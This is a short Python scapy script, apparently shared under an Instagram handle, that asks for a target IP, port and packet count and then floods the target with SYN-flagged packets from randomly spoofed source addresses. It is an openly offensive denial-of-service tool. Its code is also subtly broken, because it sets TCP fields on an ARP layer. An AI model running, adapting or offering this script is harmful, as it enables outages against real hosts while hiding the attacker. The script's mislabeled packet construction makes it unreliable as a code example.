from os import system
from sys import stdout
from scapy.all import *
from random import randint

def randomIP():
	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
	return ip


def randInt():
	x = randint(1000,9000)
	return x


def TCP_Flood(dstIP,dstPort,counter):
	total = 0
	print ("Packets are sending ...")

	for x in range (0,counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		ARP_Packet = ARP ()
		ARP_Packet.sport = s_port
		ARP_Packet.dport = dstPort
		ARP_Packet.flags = "S"
		ARP_Packet.seq = s_eq
		ARP_Packet.window = w_indow

		send(IP_Packet/ARP_Packet, verbose=0)
		total+=1

	stdout.write("\nTotal packets sent: %i\n" % total)


def info():
	system("clear")
	print (".....................................")
	print (":       instagram:re43p3r           :")
	print (":...................................:")
	print (":            MALFORMED              :")
	print ("....................................:")

	dstIP = input ("\nTarget IP : ")
	dstPort = input ("Target Port : ")

	return dstIP,int(dstPort)


def main():
	dstIP,dstPort = info()
	counter = input ("How many packets do you want to send : ")
	TCP_Flood(dstIP,dstPort,int(counter))

main()
